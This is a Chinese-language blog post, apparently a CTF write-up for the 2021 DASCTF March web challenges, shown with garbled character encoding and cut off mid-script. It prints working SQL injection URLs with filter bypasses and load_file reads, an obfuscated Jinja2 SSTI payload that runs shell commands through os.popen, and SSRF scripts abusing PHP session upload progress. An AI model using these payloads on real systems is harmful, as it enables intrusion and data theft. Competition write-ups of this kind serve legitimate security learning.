<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="æœç´¢" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-08T05:12:57.000Z" title="2021-04-08T05:12:57.000Z">2021-04-08</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-04-08T05:22:02.334Z" title="2021-04-08T05:22:02.334Z">2021-04-08</time>æ›´æ–°</span><span class="level-item">11 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦1715ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/08/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9Bweb%E6%80%BB%E7%BB%93/">2021 DASCTFä¸‰æœˆèµ›webæ€»ç»“</a></h1><div class="content"><h1 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h1><p>unionæ³¨å…¥</p>
<p>å¼€å§‹å°±æç¤ºäº†sqlè¯­å¥ï¼Œå•å¼•å·å’Œç©ºæ ¼è¢«è¿‡æ»¤ï¼ŒåŒå¼•å·é—­åˆå³å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; &#39;$query&#39; OR username &#x3D; \&quot;$query\&quot;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/cx91B7bO8SjqKYJ.png" alt="image-20210406122623737.png"></p>
<p>è¯»å–è¡¨å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/YIagPrL1ysVqfHd.png" alt="image-20210406122601658.png"></p>
<p>è¯»å–åˆ—å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/e7LIlZFmbTM6XtY.png" alt="image-20210406122733420.png"></p>
<p>è¯»å–f1agdasï¼Œå¾—çŸ¥flagåœ¨flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd%22&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(f1agdas)&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/CZ3cdwuoJ8aHbh5.png" alt="image-20210406123644931.png"></p>
<p>ä½¿ç”¨load_Fileè¯»å–æ–‡ä»¶ï¼Œflag.txtè¢«è¿‡æ»¤ï¼Œæ”¹ä¸ºhexç¼–ç å³å¯ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;hex(load_file(0x2F666C61672E747874))),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/cm2gwbz6ltQ3M5x.png" alt="image-20210406123147212.png"></p>
<p>è§£ç åå¾—åˆ°flagï¼ŒDASCTF{352f1504696639a0d71c2d36591d505b}</p>
<p><img src="https://i.loli.net/2021/04/08/nMZIXqO9zm2Kobh.png" alt="image-20210406123303737.png"></p>
<h1 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h1><p>sstiï¼Œæºç ä¸­ç»™å‡ºäº†é»‘åå•ï¼Œå¯ä»¥ä½¿ç”¨joinè¿‡æ»¤å™¨å’Œunicodeæ•°å­—ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">Hi young boy!&lt;&#x2F;br&gt;</span><br><span class="line">Do you like ssti?&lt;&#x2F;br&gt;</span><br><span class="line"></span><br><span class="line">blacklist&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;count&#39;,&#39;length&#39;,&#39;ï¼&#39;,&#39;ï¼‘&#39;,&#39;ï¼’&#39;,&#39;ï¼“&#39;,&#39;ï¼”&#39;,&#39;ï¼•&#39;,&#39;ï¼–&#39;,&#39;ï¼—&#39;,&#39;ï¼˜&#39;,&#39;ï¼™&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;&#x2F;br&gt;    </span><br><span class="line">&lt;&#x2F;br&gt;   </span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125; # pop</span><br><span class="line">&#123;%set b&#x3D;lipsum|string|list|attr(a)(ğŸ™ğŸ )%&#125; # _</span><br><span class="line">&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125; # globals</span><br><span class="line">&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125; # getitem</span><br><span class="line">&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125; # os</span><br><span class="line">&#123;%set f&#x3D;lipsum|string|list|attr(a)(ğŸ¡)%&#125; # ç©ºæ ¼</span><br><span class="line">&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%&#125; # æ–œæ </span><br><span class="line">&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125; # cat &#x2F;flag</span><br><span class="line">&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125; # popen</span><br><span class="line">&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125; # read</span><br><span class="line">&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%&#125; #ç‚¹</span><br><span class="line">&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125; #ls &#x2F;var&#x2F;www&#x2F;flask</span><br><span class="line">&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br><span class="line">#æœ€åæ‹¼æ¥èµ·æ¥</span><br><span class="line">#&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;var&#x2F;www&#x2F;flask&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set b&#x3D;lipsum|string|list|attr(a)(ğŸ™ğŸ )%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;%set f&#x3D;lipsum|string|list|attr(a)(ğŸ¡)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%&#125;&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125;&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125;&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125;&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%&#125;&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125;&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/y2qaIMUh7VASDQc.png" alt="image-20210408130137429.png"></p>
<h1 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h1><p>index.phpï¼Œå¼€å§‹çš„sessionå¯ä»¥ä½¿ç”¨session.upload_progressç»•è¿‡</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
<p><img src="https://i.loli.net/2021/04/08/A4FQCeun9IYcKJT.png" alt="image-20210406214427556.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no session&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your IP is internal yoyoyo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>å‘ç°ç›®å½•ä¸‹å­˜åœ¨admin.phpï¼Œå¿…é¡»è¦æœ¬åœ°è®¿é—®</p>
<p><img src="https://i.loli.net/2021/04/08/SKuT3lwEdmsrbyq.png" alt="image-20210406214347962.png"></p>
<p>æ„é€ ssrfè¯·æ±‚admin.php</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10015/?url=http://localhost/admin.php&quot;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">resp = session.post(url,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;,files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2021/04/08/ux6jz81kNdUnWyA.png" alt="image-20210406214205226.png"></p>
<p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶login_admin.phpï¼Œ/yuanma_f0r_eAZy_logon.zip</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;	</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Admin Login&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;application/x-javascript&quot;</span>&gt; addEventListener(<span class="string">&quot;load&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; setTimeout(hideURLbar, <span class="number">0</span>); &#125;, <span class="literal">false</span>); <span class="function"><span class="keyword">function</span> <span class="title">hideURLbar</span>(<span class="params"></span>)</span>&#123; window.scrollTo(<span class="number">0</span>,<span class="number">1</span>); &#125; &lt;/script&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;Flat Dark Web Login Form Responsive Templates, Iphone Widget Template, Smartphone login forms,Login form, Widget Template, Responsive Templates, a Ipad 404 Templates, Flat Responsive Templates&quot;</span> /&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">&lt;!--/yuanma_f0r_eAZy_logon.zip--&gt;</span><br><span class="line">&lt;!--webfonts--&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;http://fonts.useso.com/css?family=PT+Sans:400,700,400italic,700italic|Oswald:400,300,700&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;http://fonts.useso.com/css?family=Exo+2&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;!--<span class="comment">//webfonts--&gt;</span></span><br><span class="line">&lt;script src=<span class="string">&quot;http://ajax.useso.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;$(document).ready(<span class="function"><span class="keyword">function</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&quot;.close&quot;</span>).on(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">		$(<span class="string">&quot;.login-form&quot;</span>).fadeOut(<span class="string">&quot;slow&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">	  		$(<span class="string">&quot;.login-form&quot;</span>).remove();</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);	  </span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> &lt;!--SIGN UP--&gt;</span><br><span class="line"> &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line">&lt;div class=&quot;login-form&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;close&quot;&gt; &lt;/div&gt;</span><br><span class="line">		&lt;div class=&quot;head-info&quot;&gt;</span><br><span class="line">			&lt;label class=&quot;lbl-1&quot;&gt; &lt;/label&gt;</span><br><span class="line">			&lt;label class=&quot;lbl-2&quot;&gt; &lt;/label&gt;</span><br><span class="line">			&lt;label class=&quot;lbl-3&quot;&gt; &lt;/label&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">			&lt;div class=&quot;clear&quot;&gt; &lt;/div&gt;</span><br><span class="line">	&lt;div class=&quot;avtar&quot;&gt;</span><br><span class="line">		&lt;img src=<span class="string">&quot;images/avtar1.png&quot;</span> /&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">			&lt;form action=<span class="string">&quot;./login_admin.php&quot;</span>&gt;</span><br><span class="line">					&lt;input type=&quot;text&quot; class=&quot;text&quot; name=&quot;username&quot; value=&quot;Username&quot; onfocus=&quot;this.value = &quot;&quot;;&quot; onblur=&quot;if (this.value == &quot;&quot;) &#123;this.value = &quot;Username&quot;;&#125;&quot; &gt;</span><br><span class="line">						&lt;div class=&quot;key&quot;&gt;</span><br><span class="line">					&lt;input type=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;Password&quot;</span> name=<span class="string">&quot;password&quot;</span> onfocus=<span class="string">&quot;this.value = &quot;</span><span class="string">&quot;;&quot;</span> onblur=<span class="string">&quot;if (this.value == &quot;</span><span class="string">&quot;) &#123;this.value = &quot;</span>Password<span class="string">&quot;;&#125;&quot;</span>&gt;</span><br><span class="line">						&lt;/div&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">	&lt;div class=&quot;signin&quot;&gt;</span><br><span class="line">		&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span> &gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"> &lt;div class=&quot;copy-rights&quot;&gt;</span><br><span class="line">					&lt;p&gt;Copyright &amp;copy; ez login aha?&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>yuanma_f0r_eAZy_logon.zipä¸­åŒ…å«ä¸€ä¸ªse1f_Log3n.php</p>
<p><img src="https://i.loli.net/2021/04/08/z1fsyGHLReTZSup.png" alt="image-20210406214240038.png"></p>
<p>se1lf_Log3n.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; and `password`=&quot;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc() <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>)) <span class="keyword">OR</span> ( (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>) )); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å­˜åœ¨å¸ƒå°”ç›²æ³¨ï¼Œæ„é€ æ³¨å…¥è¯­å¥åç”¨ssrfè¯·æ±‚å³å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10015&#x2F;?url&#x3D;http:&#x2F;&#x2F;localhost&#x2F;&#x2F;se1f_Log3n.php?username&#x3D;admin&#39;or 1&#x3D;1%23password&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">asc_str = <span 